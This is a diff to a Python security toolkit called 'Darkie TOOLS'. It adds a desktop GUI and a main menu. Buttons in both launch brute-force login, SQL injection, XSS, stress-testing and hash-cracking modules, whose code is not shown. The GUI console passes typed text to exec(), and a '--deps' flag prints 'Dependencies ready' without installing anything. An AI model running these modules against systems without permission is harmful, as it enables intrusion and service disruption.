+                ("Suspicious Procs", lambda: self._run_module("Endpoint", ep_suspicious_processes)),
+                ("File Integrity", lambda: self._run_module("Endpoint", ep_file_integrity)),
+                ("Net Connections", lambda: self._run_module("Endpoint", ep_network_connections)),
+            ])
+            self._add_output(parent)
+
+        def _build_vuln(self, parent):
+            self._add_button_row(parent, [
+                ("Advanced Scan", lambda: self._run_module("Vulnerability", vuln_advanced_scan)),
+                ("CVE Lookup", lambda: self._run_module("Vulnerability", vuln_cve_lookup)),
+                ("Assessment", lambda: self._run_module("Vulnerability", vuln_assessment)),
+                ("Config Check", lambda: self._run_module("Vulnerability", vuln_config_check)),
+            ])
+            self._add_output(parent)
+
+        def _build_data(self, parent):
+            self._add_button_row(parent, [
+                ("Encrypt", lambda: self._run_module("Data Protection", data_encrypt)),
+                ("Decrypt", lambda: self._run_module("Data Protection", data_encrypt)),
+                ("Hash Generator", lambda: self._run_module("Data Protection", hash_generator)),
+                ("Password Strength", lambda: self._run_module("Data Protection", data_password_strength)),
+            ])
+            self._add_output(parent)
+
+        def _build_pentest(self, parent):
+            self._add_button_row(parent, [
+                ("Port Scan", lambda: self._run_module("Pentest", legacy_portscan)),
+                ("Service Enum", lambda: self._run_module("Pentest", vuln_advanced_scan)),
+                ("Brute Force", lambda: self._run_module("Pentest", pentest_bruteforce_login)),
+                ("SQL Injection", lambda: self._run_module("Pentest", pentest_sqli)),
+                ("XSS", lambda: self._run_module("Pentest", pentest_xss)),
+            ])
+            self._add_output(parent)
+
+        def _build_siem(self, parent):
+            self._add_button_row(parent, [
+                ("Log Analyzer", lambda: self._run_module("SIEM", siem_log_analyzer)),
+                ("Threat Patterns", lambda: self._run_module("SIEM", siem_threat_patterns)),
+                ("Alert Viewer", lambda: self._run_module("SIEM", siem_alert_viewer)),
+                ("Realtime Monitor", lambda: self._run_module("SIEM", siem_realtime_monitor)),
+            ])
+            self._add_output(parent)
+
+        def _build_stress(self, parent):
+            self._add_button_row(parent, [
+                ("Stress Test Menu", lambda: self._run_module("Stress Test", menu_stress)),
+                ("Find MC Ports", lambda: self._run_module("Stress Test",
+                                                           lambda: mc_find_ports(input("Target IP: ")))),
+            ])
+            self._add_output(parent)
+
+        def _build_osint(self, parent):
+            self._add_button_row(parent, [
+                ("Menu", lambda: self._run_module("OSINT", menu_osint)),
+                ("Shodan", lambda: self._run_module("OSINT", osint_shodan)),
+                ("Censys", lambda: self._run_module("OSINT", osint_censys)),
+                ("CT Log", lambda: self._run_module("OSINT", osint_ct_log)),
+                ("DNS History", lambda: self._run_module("OSINT", osint_dns_history)),
+                ("Wayback", lambda: self._run_module("OSINT", osint_wayback)),
+            ])
+            self._add_output(parent)
+
+        def _build_telephone(self, parent):
+            self._add_button_row(parent, [
+                ("Menu", lambda: self._run_module("Telephone", menu_telephone)),
+            ])
+            self._add_output(parent)
+
+        def _build_netutils(self, parent):
+            self._add_button_row(parent, [
+                ("Menu", lambda: self._run_module("Net Utils", menu_netutils)),
+                ("Ping", lambda: self._run_module("Net Utils", legacy_ping)),
+                ("Traceroute", lambda: self._run_module("Net Utils", legacy_traceroute)),
+                ("DNS Lookup", lambda: self._run_module("Net Utils", osint_dns)),
+                ("Whois", lambda: self._run_module("Net Utils", osint_whois)),
+            ])
+            self._add_output(parent)
+
+        def _build_hash_crypto(self, parent):
+            self._add_button_row(parent, [
+                ("Menu", lambda: self._run_module("Hash & Crypto", menu_hash_crypto)),
+            ])
+            self._add_output(parent)
+
+        def _build_audit(self, parent):
+            self._add_button_row(parent, [
+                ("Menu", lambda: self._run_module("Security Audit", menu_system_audit)),
+            ])
+            self._add_output(parent)
+
+        def _build_adv_network(self, parent):
+            self._add_button_row(parent, [
+                ("Menu", lambda: self._run_module("Adv Network", menu_adv_network)),
+            ])
+            self._add_output(parent)
+
+        def _build_adv_osint(self, parent):
+            self._add_button_row(parent, [
+                ("Recon Engine", lambda: self._run_module("Adv OSINT", osint_recon_engine)),
+                ("Censys Search", lambda: self._run_module("Adv OSINT", osint_censys_search)),
+            ])
+            self._add_output(parent)
+
+        def _build_wifi(self, parent):
+            self._add_button_row(parent, [
+                ("Menu", lambda: self._run_module("WiFi", menu_wifi)),
+                ("Password Audit", lambda: self._run_module("WiFi", wifi_password_audit)),
+            ])
+            self._add_output(parent)
+
+        def _build_reports(self, parent):
+            self._add_button_row(parent, [
+                ("Generate", lambda: self._run_module("Reports", menu_reports)),
+            ])
+            self._add_output(parent)
+
+        def log(self, msg, tag="info"):
+            if hasattr(self, "console_text"):
+                self.console_text.configure(state=tk.NORMAL)
+                self.console_text.insert(tk.END, f"[{time.strftime('%H:%M:%S')}] {msg}\n")
+                self.console_text.see(tk.END)
+                self.console_text.configure(state=tk.DISABLED)
+
+        def _build_console(self, parent):
+            console_frame = ttk.Frame(parent)
+            console_frame.pack(fill=tk.BOTH, expand=True)
+            self.console_text = self._output_widget(console_frame)
+            self.console_text.configure(state=tk.DISABLED)
+            entry_frame = ttk.Frame(console_frame)
+            entry_frame.pack(fill=tk.X, padx=5, pady=3)
+            self.console_var = tk.StringVar()
+            entry = ttk.Entry(entry_frame, textvariable=self.console_var)
+            entry.pack(side=tk.LEFT, fill=tk.X, expand=True)
+            entry.bind("<Return>", self._console_exec)
+            ttk.Button(entry_frame, text="Run", command=self._console_exec).pack(side=tk.RIGHT, padx=5)
+
+        def _console_exec(self, event=None):
+            cmd = self.console_var.get().strip()
+            if not cmd:
+                return
+            self.console_var.set("")
+            self.console_text.configure(state=tk.NORMAL)
+            self.console_text.insert(tk.END, f"> {cmd}\n")
+            self.console_text.configure(state=tk.DISABLED)
+
+            def run_cmd():
+                try:
+                    exec(cmd, globals())
+                except Exception as e:
+                    self.console_text.configure(state=tk.NORMAL)
+                    self.console_text.insert(tk.END, f"Error: {e}\n")
+                    self.console_text.see(tk.END)
+                    self.console_text.configure(state=tk.DISABLED)
+
+            _run_in_thread(run_cmd)
+
+    root = tk.Tk()
+    _DarkieGUI(root)
+    root.mainloop()
+
+
+def menu_gui():
+    """Beginner-friendly menu for the clickable interfaces."""
+    while True:
+        header_box("Graphical Interfaces", Fore.GREEN)
+        print(f"  {c('[1]', Fore.GREEN)}  Web Dashboard     {c_dim('opens in your browser (works everywhere)', Fore.CYAN)}")
+        print(f"  {c('[2]', Fore.CYAN)}  Desktop App       {c_dim('a clickable window on your computer (tkinter)', Fore.MAGENTA)}")
+        print(f"  {c('[b]', Fore.YELLOW)}  Back to main menu")
+        print()
+        ch = input(f"  {c(f'Choice {SYM_PROMPT} ', Fore.CYAN)}").strip().lower()
+        if ch == "1":
+            try:
+                p = input(f"  {c(f'Port (default 5000) {SYM_PROMPT} ', Fore.CYAN)}").strip()
+                start_web_gui(port=int(p) if p.isdigit() else 5000)
+            except KeyboardInterrupt:
+                continue
+        elif ch == "2":
+            start_desktop_gui()
+        elif ch == "b":
+            break
+        else:
+            print(f"  {RED}Invalid choice.{RESET}")
+
+
+# ──────────────────────────────────────────────────────────
+#  BEGINNER HELP
+# ──────────────────────────────────────────────────────────
+
+def _print_help():
+    print(f"\n  {c('How to use Darkie TOOLS:', Fore.CYAN)}")
+    print(f"  {c('1.', Fore.GREEN)}  Type a number and press Enter to open that module.")
+    print(f"  {c('2.', Fore.GREEN)}  Inside a module, pick an option the same way.")
+    print(f"  {c('3.', Fore.GREEN)}  Press 'b' to go back to the previous menu.")
+    print(f"  {c('4.', Fore.GREEN)}  Press 'q' to quit.")
+    print(f"  {c('5.', Fore.GREEN)}  Choose option 17 for a clickable graphical interface.")
+    print(f"\n  {Back.RED}{Fore.WHITE} IMPORTANT {Style.RESET_ALL}{Fore.YELLOW}  Only test systems you own or have permission to test.{Style.RESET_ALL}")
+    input(f"\n  {c('Press Enter to continue...', Fore.CYAN)}")
+
+
+# ──────────────────────────────────────────────────────────
+#  MAIN MENU
+# ──────────────────────────────────────────────────────────
+
+MAIN_MENU = [
+    ("1",  "Network & Threat Monitoring", "traffic capture, IDS, DDoS detection", Fore.RED),
+    ("2",  "Endpoint Security", "processes, files, network connections", Fore.MAGENTA),
+    ("3",  "Vulnerability Management", "scan targets and check for weaknesses", Fore.BLUE),
+    ("4",  "Data & Access Protection", "encryption, password strength checks", Fore.YELLOW),
+    ("5",  "Ethical Hacking & Pentest", "ports, SQL injection, XSS, brute force", Fore.GREEN),
+    ("6",  "SIEM & Log Analysis", "analyze logs and spot threat patterns", Fore.CYAN),
+    ("7",  "Stress Testing", "load tests for websites & Minecraft servers", Fore.RED),
+    ("8",  "OSINT Reconnaissance", "gather public info about a target", Fore.YELLOW),
+    ("9",  "Telephone Tools", "analyze and format phone numbers", Fore.MAGENTA),
+    ("10", "Network Utilities", "ping, traceroute, security headers", Fore.BLUE),
+    ("11", "Hash & Crypto Tools", "make hashes, crack hashes, generate passwords", Fore.CYAN),
+    ("12", "System Security Audit", "rootkits, SUID files, cron jobs, logs", Fore.RED),
+    ("13", "Advanced Network", "port knocking, firewall, advanced scans", Fore.BLUE),
+    ("14", "Advanced OSINT", "recon engine, Censys search", Fore.YELLOW),
+    ("15", "WiFi & Wireless", "audit your own wireless network", Fore.MAGENTA),
+    ("16", "Report Generator", "build a report of a previous scan", Fore.CYAN),
+    ("17", "Graphical Interfaces", "open the clickable Web or Desktop GUI", Fore.GREEN),
+]
+
+
 def main():
     print_banner()
     while True:
         header_box("Darkie TOOLS v2.2 — Ultimate Cyber Toolkit", Fore.CYAN)
-        print(f"  {c('[1]', Fore.RED)}    Network & Threat Monitoring")
-        print(f"  {c('[2]', Fore.MAGENTA)}  Endpoint Security")
-        print(f"  {c('[3]', Fore.BLUE)}   Vulnerability Management")
-        print(f"  {c('[4]', Fore.YELLOW)}  Data & Access Protection")
-        print(f"  {c('[5]', Fore.GREEN)}   Ethical Hacking & Pentest")
-        print(f"  {c('[6]', Fore.CYAN)}   SIEM & Log Analysis")
-        print(f"  {c('[7]', Fore.RED)}    Stress Testing")
-        print(f"  {c('[8]', Fore.YELLOW)}  OSINT Reconnaissance")
-        print(f"  {c('[9]', Fore.MAGENTA)}  Telephone Tools")
-        print(f"  {c('[10]', Fore.BLUE)}  Network Utilities")
-        print(f"  {c('[11]', Fore.CYAN)}  Hash & Crypto Tools")
-        print(f"  {c('[12]', Fore.RED)}   System Security Audit")
-        print(f"  {c('[13]', Fore.BLUE)}  Advanced Network")
-        print(f"  {c('[14]', Fore.YELLOW)}  Advanced OSINT")
-        print(f"  {c('[15]', Fore.MAGENTA)}  WiFi & Wireless")
-        print(f"  {c('[16]', Fore.CYAN)}  Report Generator")
-        print(f"  {c('[q]', Fore.RED)}    Quit")
+        for num, name, desc, col in MAIN_MENU:
+            print(f"  {c(('['+num+']').ljust(4), col)} {name:<30} {c(desc, Fore.MAGENTA)}")
+        print()
+        print(f"  {c('[?]', Fore.YELLOW)}  Help   {c('[q]', Fore.RED)}  Quit")
         print()
 
         try:
-            choice = input(f"  {c(f'Select module {SYM_PROMPT} ', Fore.CYAN)}").strip()
-            if choice == "1": menu_network_threat()
+            choice = input(f"  {c(f'What would you like to do? {SYM_PROMPT} ', Fore.CYAN)}").strip().lower()
+            if choice == "?":
+                _print_help()
+            elif choice == "q":
+                print(f"\n  {c('Goodbye! Stay secure and ethical.', Fore.GREEN)}\n")
+                break
+            elif choice == "1": menu_network_threat()
             elif choice == "2": menu_endpoint()
             elif choice == "3": menu_vuln()
             elif choice == "4": menu_data()
@@ -6833,9 +8251,7 @@ def main():
             elif choice == "14": menu_adv_osint()
             elif choice == "15": menu_wifi()
             elif choice == "16": menu_reports()
-            elif choice.lower() == "q":
-                print(f"\n  {c('Goodbye! Stay secure and ethical.', Fore.GREEN)}\n")
-                break
+            elif choice == "17": menu_gui()
             else:
                 print(f"  {RED}Invalid choice.{RESET}")
         except KeyboardInterrupt:
@@ -6847,8 +8263,29 @@ def main():
 
 
 if __name__ == "__main__":
-    try:
-        main()
-    except KeyboardInterrupt:
-        print(f"\n\n  {c('Goodbye! Stay secure and ethical.', Fore.GREEN)}\n")
+    import argparse
+    parser = argparse.ArgumentParser(
+        description="Darkie TOOLS v2.2 — Ultimate Cyber Toolkit (educational, own-account only)",
+        epilog="Examples:\n  python3 tool.py            start the interactive menu\n  python3 tool.py --web      open the Web Dashboard\n  python3 tool.py --web 8080  web dashboard on port 8080\n  python3 tool.py --gui     open the Desktop GUI",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+    )
+    parser.add_argument("--web", nargs="?", const=5000, type=int, metavar="PORT",
+                        help="start the Web Dashboard in your browser (default port 5000)")
+    parser.add_argument("--gui", action="store_true", help="start the Desktop GUI (tkinter)")
+    parser.add_argument("--host", default="127.0.0.1", help="host to bind the Web Dashboard to (default 127.0.0.1)")
+    parser.add_argument("--deps", action="store_true",
+                        help="install missing dependencies automatically, then exit")
+    args = parser.parse_args()
+    if args.deps:
+        print(f"  {GREEN}{SYM_CHECK}  Dependencies ready.{RESET}")
         sys.exit(0)
+    if args.web is not None:
+        start_web_gui(host=args.host, port=args.web)
+    elif args.gui:
+        start_desktop_gui()
+    else:
+        try:
+            main()
+        except KeyboardInterrupt:
+            print(f"\n\n  {c('Goodbye! Stay secure and ethical.', Fore.GREEN)}\n")
+            sys.exit(0)
